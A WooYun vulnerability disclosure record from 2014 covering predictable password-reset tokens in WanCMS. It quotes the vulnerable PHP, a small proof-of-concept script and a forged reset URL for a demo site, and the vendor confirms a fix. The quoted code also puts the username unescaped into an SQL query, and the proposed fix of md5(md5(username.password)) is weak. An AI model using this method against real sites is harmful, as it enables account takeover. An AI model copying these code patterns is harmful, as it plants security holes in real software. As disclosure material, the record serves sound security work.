{"id": 4723, "wybug_id": "wooyun-2014-049284", "wybug_title": "WanCMS 可修改任意用户密码（源码详析+实例演示）", "wybug_corp": "wancms.com", "wybug_author": "lxj616", "wybug_date": "2014-01-19 16:27", "wybug_open_date": "2014-04-19 16:27", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-19：\t细节向公众公开  简要描述： WanCMS 可修改任意用户密码（源码详析+实例演示）在官方演示站demo.wancms.com做实例测试（未测试旧版本，据原理分析可能是全版本通杀，本测试使用的版本是站长之家20130102的1.3免费版，官网不明版本演示测试成功） 详细说明：  /app/Lib/Action/AccountsAction.class.php     line:580\n//密码找回相关代码\t\tif ($_POST ['submit']) {\t\t\t$email = trim ( $_POST ['t'] );\t\t\t$username = trim ( $_POST ['username'] );\t\t\t$public = A ( 'Public' );//注意下面这句\t\t\t$reurl = $config ['DOMAIN'] . '/accounts/forget_password_t?vc=' . md5 ( md5 ( $username ) );//MD5是hash函数，而非加密函数，当用户得知username后可轻易推断md5散列值，因此，密码找回验证完全被绕过//与以下无关\t\t\t$subject = \"用户邮箱找回密码'\";\t\t\t$body = \"尊敬的网页游戏用户您好：请点击以下地址找回您的密码,\" . $reurl . \"祝您游戏愉快！有任何问题可到我们官方网站联系\";\t\t\tif ($public->think_send_mail ( $email, '平台系统信息', $subject, $body )) {\t\t\t\t$arr_i ['user_status'] = 1;   //所以要先申请找回\t\t\t\t$arr_i ['pwd_flag'] = md5 ( md5 ( $username ) );\t\t\t\t$member->where ( \"username ='\" . $username . \"'\" )->save ( $arr_i ); // 更新状态\t\t\t\t$this->success ( '已发送到您的邮箱，请去邮箱完成验证', '/' );\t\t\t} else {\t\t\t\t$this->error ( '发送失败 ，请联系客服', '/' );\t\t\t}\t\t}\n所以，1.点击找回密码2.发送验证邮件3.计算md5 ( md5 ( $username ) )4.重置密码poc：\n<?php $username='lxj616';$t=md5 ( md5 ( $username ) );echo $t;?>\n\nhttp://demo.31wan.cn/accounts/forget_password_t?vc=c1bfd25357a080c23ac5297c8ce6e7d6\n注：验证时别忘了先点击“发送验证邮件”\n\n可以计算一下poc生成 c1bfd25357a080c23ac5297c8ce6e7d6漏洞成因总结为：身份令牌可预测   漏洞证明：  \n\n   修复方案：  $reurl = $config ['DOMAIN'] . '/accounts/forget_password_t?vc=' . md5 ( md5 ( $username ) );改为：$reurl = $config ['DOMAIN'] . '/accounts/forget_password_t?vc=' . md5 ( md5 ( $username.$password ) );前后文按照此方法修改即可，由于攻击者无法预先获知password和random，因此无法再伪造找回密码链接   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-20 14:16 厂商回复： 已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-19 16:38 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  demo已挂？    \n     2014-01-19 17:40 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  @wefgod 错了。。。应该是http://demo.31wan.cn，正文里是对的。。。。    \n     2014-01-19 17:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @lxj616 PHP的路过了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}